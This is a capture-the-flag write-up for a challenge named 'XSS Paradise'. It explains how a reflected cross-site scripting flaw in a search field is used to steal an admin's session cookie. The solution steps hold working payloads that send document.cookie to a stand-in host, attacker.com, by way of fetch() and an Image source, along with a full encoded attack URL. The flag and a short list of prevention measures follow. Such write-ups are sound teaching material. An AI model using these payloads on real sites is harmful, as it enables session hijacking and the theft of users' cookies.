# XSS Paradise - Writeup

## Challenge Description
Craft an XSS payload to steal the admin's cookie.

## Solution

### Step 1: Identify the Vulnerability
The search parameter reflects user input without sanitization:
```html
<input value="USER_INPUT_HERE">
```

### Step 2: Craft the Payload
Break out of the input attribute and inject script:
```javascript
"><script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script><input value="
```

### Step 3: URL Encode and Inject
```
https://vulnerable.com/search?q="><script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script><input%20value="
```

### Step 4: Simpler Payload for Testing
```javascript
"><img src=x onerror="alert('XSS')"><input value="
```

### Step 5: Cookie Stealing
When admin visits the malicious link, the script executes and sends their cookie to your server.

```javascript
new Image().src='https://attacker.com/log?cookie='+encodeURIComponent(document.cookie);
```

## Flag
`MCTF{XSS_COOKIE_STOLEN_SUCCESSFULLY}`

## Prevention
- Use Content Security Policy (CSP)
- HTML encode all user input
- Use templating engines with auto-escaping
- Implement HttpOnly flag on cookies
- Use modern frameworks with built-in XSS protection